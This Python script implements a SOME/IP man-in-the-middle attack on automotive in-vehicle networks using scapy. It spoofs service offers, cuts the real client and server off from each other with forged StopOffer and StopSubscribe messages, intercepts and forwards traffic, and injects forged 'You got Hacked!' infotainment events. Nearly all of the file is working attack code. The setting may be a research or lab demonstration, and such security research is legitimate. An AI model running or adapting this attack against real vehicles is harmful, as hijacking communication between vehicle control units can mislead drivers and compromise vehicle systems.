import os
import socket
import time
import signal
import sys
from scapy.all import *
from scapy.layers.l2 import Ether
from scapy.layers.inet import IP
from scapy.layers.inet import UDP
from scapy.contrib.automotive.someip import SOMEIP, SD

from someip_mitm_utils import *

# ============================================================================
# CONFIGURATION
# ============================================================================
INTERFACE = os.getenv("INTERFACE", "eth0")
ATTACKER_IP = get_if_addr(INTERFACE)
ATTACKER_MAC = get_if_hwaddr(INTERFACE)
BROADCAST_IP = os.getenv("BROADCAST_IP", "224.224.224.245")
ATTACKER_PORT = int(os.getenv("ATTACKER_PORT", 45999))
TIMEOUT = int(os.getenv("TIMEOUT", 120))
DEBUG = os.getenv("DEBUG", "True").lower() == "true"

def log(msg, step=None):
    if DEBUG:
        prefix = f"[Step {step}]" if step else "[Info]"
        print(f"{prefix:<10} {msg}")

# ============================================================================
# ATTACKER CLASS
# ============================================================================
class SomeIpMitmAttacker:
    def __init__(self):
        self.base_info = BaseInfo()
        self._sockets = []
        self._running = True
        self._async_sniffer = None
        self._claim_ports()
        
        # Setup signal handling for graceful exit
        signal.signal(signal.SIGINT, self._signal_handler)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def _signal_handler(self, sig, frame):
        log("Shutdown signal received. Cleaning up...")
        self._running = False
        if self._async_sniffer and self._async_sniffer.running:
            self._async_sniffer.stop()
        for s in self._sockets:
            s.close()
        sys.exit(0)

    def _claim_ports(self):
        """Prevent Linux Kernel from sending ICMP Port Unreachable by binding dummy sockets."""
        ports = [30490, 30509, ATTACKER_PORT]
        for port in ports:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(('', port))
                self._sockets.append(s)
            except Exception as e:
                log(f"Warning: Could not bind to port {port}: {e}")

    def execute(self):
        log("=== SOME/IP MITM Attacker Started ===")
        
        # Phase 1: Information Gathering
        self.phase_1_information_gathering()
        
        if not self._running: return

        # The main attack loop handles Phase 2, 3, and 4 dynamically based on incoming packets.
        log("=== Entering main attack loop ===")
        self.attack_loop()

    # ------------------------------------------------------------------------
    # PHASE 1: Information Gathering (Step 1)
    # ------------------------------------------------------------------------
    def phase_1_information_gathering(self):
        log("Gathering information for attack - Waiting for service offer...", "1")
        while self._running and (self.base_info.client is None or self.base_info.server is None or self.base_info.sd_offerP is None):
            # Sniff for the real server's OfferService
            sniff(iface=INTERFACE, timeout=2, count=1, 
                  filter=f"udp and dst host {BROADCAST_IP} and dst port 30490 and src host not {ATTACKER_IP}",
                  lfilter=lambda pkt: check_if_offer(pkt), 
                  prn=lambda pkt: self._handle_initial_offer(pkt))

    def _handle_initial_offer(self, offPck):
        if not self._running: return
        
        sdEntryArray = offPck[SD].entry_array[0]
        # Initialize Serverdata
        serviceServer = Serverdata(
            offPck[IP].src, offPck[Ether].src, 
            compute_meth_id(offPck[SOMEIP].sub_id, offPck[SOMEIP].event_id),
            sdEntryArray.srv_id, sdEntryArray.inst_id
        )
        log(f"Discovered server: IP={serviceServer.ip}, ServiceID={hex(serviceServer.sd_service_id)}", "1")

        spoofed_server = offPck[IP].src
        manipulatedOff = change_src_srv_offer(offPck)
        
        # Start background sniffer to catch the client's subscription to our spoofed offer
        log("Starting async sniffer to catch client subscription...", "1")
        self._async_sniffer = AsyncSniffer(
            iface=INTERFACE, 
            filter=f"udp and dst host {ATTACKER_IP} and src host not {spoofed_server} and dst port 30490",
            lfilter=lambda subPkt: check_service_inst_id(subPkt, serviceServer.sd_service_id, serviceServer.sd_instance_id),
            prn=lambda victpkt: self._initialize_client_data(serviceServer, manipulatedOff, victpkt)
        )
        self._async_sniffer.start()

        # Send spoofed offers to bait the client
        for i in range(3):
            if not self._running or self.base_info.client is not None: 
                break
            log(f"Sending spoofed offer to bait client (Attempt {i+1}/3)", "5")
            sendp(manipulatedOff, iface=INTERFACE, verbose=False)
            manipulatedOff[SOMEIP].session_id += 1
            
            # Use smaller sleeps to stay responsive to signals
            for _ in range(10):
                if not self._running or self.base_info.client is not None: break
                time.sleep(0.1)
        
        if self._async_sniffer.running:
            self._async_sniffer.stop()

    def _initialize_client_data(self, server: Serverdata, manOffP: SD, victimSubPacket: SD):
        log("Caught client subscription packet", "6")
        # Initialize Clientdata from the victim's subscription packet
        client = Clientdata(
            victimSubPacket[SD].option_array[0].addr, 
            victimSubPacket[Ether].src, 
            victimSubPacket[SD].option_array[0].port, 
            victimSubPacket[SD].entry_array[0].eventgroup_id
        )
        log(f"Discovered client: IP={client.ip}, Port={client.port}", "1")
        
        # Store in state
        self.base_info.client = client
        self.base_info.server = server
        self.base_info.sd_offerP = manOffP

    # ------------------------------------------------------------------------
    # MAIN LOOP: Handles Phases 2, 3, and 4
    # ------------------------------------------------------------------------
    def attack_loop(self):
        # We use a loop with short timeouts to remain responsive to shutdown signals
        while self._running:
            sniff(iface=INTERFACE, timeout=1, 
                  filter=f'udp and src host not {ATTACKER_IP} and (dst port 30490 or dst port 30509 or dst port {self.base_info.client.port} or dst port {ATTACKER_PORT})',
                  lfilter=lambda pkt: ip_lfilter(pkt, self.base_info, BROADCAST_IP, ATTACKER_IP), 
                  prn=lambda pkt: self._packet_handler(pkt))

    def _packet_handler(self, packet):
        if not self._running: return
        
        client = self.base_info.client
        server = self.base_info.server
        
        # --------------------------------------------------------------------
        # Phase 2 & 3: Hooking and Isolation logic based on received offers
        # --------------------------------------------------------------------
        if check_if_offer(packet):
            log("Received new offer from server - Executing hook and isolation...", "1")
            
            # Step 2: Attacker Subscribes to Server
            log("Sending Subscribe to server", "2")
            subscr_srv(ATTACKER_IP, ATTACKER_MAC, ATTACKER_PORT, INTERFACE, client, server)
            
            # Step 3: Server Acknowledges Subscription (Implicitly handled by server)
            log("Server acknowledged subscription", "3")
            time.sleep(0.03)
            
            # Step 4: Isolate Client (Send StopOffer in name of Server)
            log("Sending spoofed StopOffer to client", "4")
            send_stop_offer(ATTACKER_IP, ATTACKER_MAC, ATTACKER_PORT, INTERFACE, client, server)
            
            # Step 5: Bait Client (Send Manipulated Offer in name of Attacker)
            log("Sending spoofed offer to client", "5")
            self.base_info.sd_offerP[SOMEIP].session_id += 1
            sendp(self.base_info.sd_offerP, iface=INTERFACE, verbose=False)
            
        # --------------------------------------------------------------------
        # Phase 3: Client Subscribes to Attacker (Step 6 received)
        # --------------------------------------------------------------------
        elif (check_if_sub_to_attk(packet, client.ip, ATTACKER_IP) and 
              check_service_inst_id(packet, server.sd_service_id, server.sd_instance_id)):
            
            log("Received subscription from client", "6")
            client.port = packet[SD].option_array[0].port
            
            # Step 7: Acknowledge Client Subscription
            log("Acknowledging client subscription", "7")
            subscr_ack_client(ATTACKER_IP, ATTACKER_MAC, INTERFACE, client, server)
            client.subscribedToAdv = True
            
            # Inject hijacked info immediately so client sees it without waiting for server events
            self._inject_hijacked_info()

            # Step 8: Isolate Server (Send StopSubscribe in name of Client)
            log("Sending spoofed StopSubscribe to server", "8")
            send_stop_sub(ATTACKER_IP, ATTACKER_MAC, INTERFACE, client, server)
        
        # --------------------------------------------------------------------
        # Phase 4: Data Forwarding and Manipulation (Steps 9, 10, 11)
        # --------------------------------------------------------------------
        elif check_someip_payload(packet):
            if packet[IP].src == server.ip and packet[IP].dst == client.ip:
                 log("Intercepted event/response from server -> client - Forwarding/Manipulating...", "9/11")
            elif packet[IP].src == client.ip and packet[IP].dst == server.ip:
                 log("Intercepted request from client -> server - Forwarding...", "10")
                 
            forward_man_sip_client(packet, client, server, ATTACKER_IP, ATTACKER_MAC, INTERFACE, DEBUG)

    def _inject_hijacked_info(self):
        """Send hijacked Station, Song, and Artist info to the client immediately."""
        client = self.base_info.client
        server = self.base_info.server
        log("Injecting hijacked information to client...", "9")
        
        # Station (0x8002)
        send_event(ATTACKER_IP, ATTACKER_MAC, client.ip, client.mac, client.port, INTERFACE, 
                   1, server.sd_service_id, server.sd_instance_id, 0x8002, 'You')
        # Song (0x8003)
        send_event(ATTACKER_IP, ATTACKER_MAC, client.ip, client.mac, client.port, INTERFACE, 
                   1, server.sd_service_id, server.sd_instance_id, 0x8003, 'got')
        # Artist (0x8004)
        send_event(ATTACKER_IP, ATTACKER_MAC, client.ip, client.mac, client.port, INTERFACE, 
                   1, server.sd_service_id, server.sd_instance_id, 0x8004, 'Hacked!')

# ============================================================================
# HELPER
# ============================================================================
def change_src_srv_offer(offP: SD):
    offP[Ether].src = ATTACKER_MAC
    offP[IP].src = ATTACKER_IP
    offP[SOMEIP].session_id = 1
    # Manipulate Options Array Endpoint option -> advertising same service but from attcker endpoint
    offP[SD].option_array[0].addr = ATTACKER_IP
    # Calculated new checksum
    del offP[IP].chksum
    del offP[UDP].chksum
    return offP


if __name__ == "__main__":
    attacker = SomeIpMitmAttacker()
    attacker.execute()
